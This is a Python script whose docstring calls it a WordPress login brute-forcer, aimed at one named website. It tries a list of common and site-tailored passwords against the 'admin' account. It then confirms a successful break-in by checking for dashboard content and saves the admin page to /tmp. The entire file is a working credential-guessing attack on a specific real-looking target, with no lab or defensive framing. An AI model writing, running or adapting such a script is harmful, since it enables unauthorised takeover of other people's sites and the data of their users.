#!/usr/bin/env python3
"""csroots.cn WP login brute with strict verification"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "https://www.csroots.cn"

PWS = ["admin123", "123456", "admin", "admin888", "12345678", "666888", "admin@123",
       "a123456", "admin123456", "123456789", "admin666", "888888", "000000", "123123",
       "admin2023", "admin2024", "admin2025", "Aa123456", "abc123456", "admin@2023",
       "123456a", "a123456789", "admin111", "123321", "5201314", "admin520", "qwer1234",
       "password", "1234567890", "admin1234", "1q2w3e4r", "pass123", "test123", "admin!@#",
       "csroots", "csroot123", "changsha", "sanhu", "cs123456", "luogu", "sanhu123",
       "root123", "luoshan", "123456789a", "admin@123456", "admin888888"]

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, url, ""

# 1. GET login (set cookies)
op = get_opener()
code, final, body = fetch(op, HOST + "/wp-login.php")
print("GET login:", code, "user_login:", "user_login" in body)

# 2. brute
for pw in PWS:
    op2 = get_opener()
    try:
        code, final, body = fetch(op2, HOST + "/wp-login.php")
    except Exception:
        continue
    data = urllib.parse.urlencode({
        "log": "admin", "pwd": pw, "wp-submit": "登录",
        "redirect_to": HOST + "/wp-admin/", "testcookie": "1"})
    code, final, resp = fetch(op2, HOST + "/wp-login.php", data=data)
    # verify: wp-admin with session
    code3, final3, body3 = fetch(op2, HOST + "/wp-admin/")
    is_login = "user_login" in body3 or "wp-login" in final3.lower()
    has_dash = ("dashboard" in body3.lower() or "仪表盘" in body3 or "wp-admin-bar" in body3 or "wp-admin/css" in body3)
    if has_dash and not is_login:
        print("!!! HIT admin/%s" % pw, flush=True)
        open("/tmp/cs_hit.html", "w").write(body3)
        break
    if pw in ["123456", "admin123", "admin"]:
        print("  tried %s (%s)" % (pw, final3[:40]), flush=True)
else:
    print("[done] no hit", flush=True)
